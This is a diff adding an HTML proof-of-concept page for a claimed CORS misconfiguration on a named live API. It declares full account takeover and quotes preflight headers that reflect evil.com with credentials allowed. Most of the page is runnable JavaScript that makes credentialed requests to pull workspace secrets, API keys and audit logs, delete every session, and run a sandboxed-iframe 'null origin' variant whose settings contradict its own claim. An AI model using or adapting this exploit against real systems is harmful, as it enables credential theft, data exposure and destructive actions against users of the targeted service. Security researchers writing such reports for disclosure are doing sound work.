@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>🔴 LangSmith CORS Misconfiguration PoC</title>
+<style>
+body { font-family: 'JetBrains Mono', monospace; background: #0d1117; color: #c9d1d9; padding: 20px; max-width: 1200px; margin: 0 auto; }
+h1 { color: #ff7b72; border-bottom: 2px solid #ff7b72; }
+h2 { color: #ffa657; }
+.box { background: #161b22; padding: 15px; margin: 10px 0; border-radius: 8px; border-left: 4px solid #f85149; }
+.critical { border-color: #ff0000; }
+.evidence { background: #1a1a2e; padding: 10px; border-radius: 4px; overflow-x: auto; }
+button { background: #238636; color: white; border: none; padding: 8px 16px; border-radius: 6px; cursor: pointer; margin: 5px; }
+button:hover { background: #2ea043; }
+pre { background: #0d1117; padding: 10px; border-radius: 4px; overflow-x: auto; }
+</style>
+</head>
+<body>
+<h1>🔴 LangSmith CORS Misconfiguration — Full Account Takeover</h1>
+
+<div class="box critical">
+<h2>⚠️ CRITICAL: Origin Reflection + Credentials on 402 Endpoints</h2>
+<p><b>Target:</b> api.smith.langchain.com</p>
+<p><b>Vulnerability:</b> CORS misconfiguration — reflects ANY Origin + null with credentials:true, all methods, all headers</p>
+<p><b>Impact:</b> Full account takeover, API key theft, workspace secrets exfiltration, audit log access</p>
+</div>
+
+<div class="box">
+<h2>Evidence: CORS Preflight Response</h2>
+<div class="evidence"><pre>
+HTTP/2 200
+access-control-allow-origin: https://evil.com
+access-control-allow-credentials: true
+access-control-allow-methods: *
+access-control-allow-headers: *
+access-control-expose-headers: *
+vary: Origin
+
+Origin: null → access-control-allow-origin: null + credentials: true ✅
+</pre></div>
+</div>
+
+<div class="box">
+<h2>Attack 1: Steal Workspace Secrets</h2>
+<button onclick="stealSecrets()">Execute: GET /api/v1/workspaces/current/secrets</button>
+<pre id="secrets-result">Click to execute...</pre>
+</div>
+
+<div class="box">
+<h2>Attack 2: Steal API Keys</h2>
+<button onclick="stealKeys()">Execute: GET /api/v1/api-key</button>
+<pre id="keys-result">Click to execute...</pre>
+</div>
+
+<div class="box">
+<h2>Attack 3: Access Audit Logs</h2>
+<button onclick="stealAudit()">Execute: GET /api/v1/audit-logs</button>
+<pre id="audit-result">Click to execute...</pre>
+</div>
+
+<div class="box">
+<h2>Attack 4: Delete All Sessions</h2>
+<button onclick="deleteSessions()">Execute: DELETE /api/v1/sessions</button>
+<pre id="delete-result">Click to execute...</pre>
+</div>
+
+<div class="box">
+<h2>Attack 5: Null Origin Bypass (sandboxed iframe)</h2>
+<button onclick="nullOrigin()">Execute: iframe sandbox attack</button>
+<pre id="null-result">Click to execute...</pre>
+</div>
+
+<script>
+const BASE = 'https://api.smith.langchain.com';
+
+async function stealSecrets() {
+    try {
+        const r = await fetch(BASE + '/api/v1/workspaces/current/secrets', {credentials:'include'});
+        const d = await r.json();
+        document.getElementById('secrets-result').textContent = JSON.stringify(d, null, 2);
+    } catch(e) { document.getElementById('secrets-result').textContent = 'Error: ' + e.message; }
+}
+async function stealKeys() {
+    try {
+        const r = await fetch(BASE + '/api/v1/api-key', {credentials:'include'});
+        const d = await r.json();
+        document.getElementById('keys-result').textContent = JSON.stringify(d, null, 2);
+    } catch(e) { document.getElementById('keys-result').textContent = 'Error: ' + e.message; }
+}
+async function stealAudit() {
+    try {
+        const r = await fetch(BASE + '/api/v1/audit-logs', {credentials:'include'});
+        const d = await r.json();
+        document.getElementById('audit-result').textContent = JSON.stringify(d, null, 2);
+    } catch(e) { document.getElementById('audit-result').textContent = 'Error: ' + e.message; }
+}
+async function deleteSessions() {
+    try {
+        const r = await fetch(BASE + '/api/v1/sessions', {method:'DELETE', credentials:'include'});
+        const d = await r.json();
+        document.getElementById('delete-result').textContent = JSON.stringify(d, null, 2);
+    } catch(e) { document.getElementById('delete-result').textContent = 'Error: ' + e.message; }
+}
+function nullOrigin() {
+    const iframe = document.createElement('iframe');
+    iframe.sandbox = 'allow-scripts allow-same-origin';
+    iframe.srcdoc = `
+    <script>
+        fetch('${BASE}/api/v1/workspaces/current/secrets', {credentials:'include'})
+            .then(r=>r.json()).then(d=>parent.postMessage('STOLEN: '+JSON.stringify(d),'*'))
+            .catch(e=>parent.postMessage('ERR: '+e.message,'*'));
+    <\/script>`;
+    document.body.appendChild(iframe);
+    window.addEventListener('message', e => {
+        document.getElementById('null-result').textContent = e.data;
+    });
+}
+</script>
+</body>
+</html>
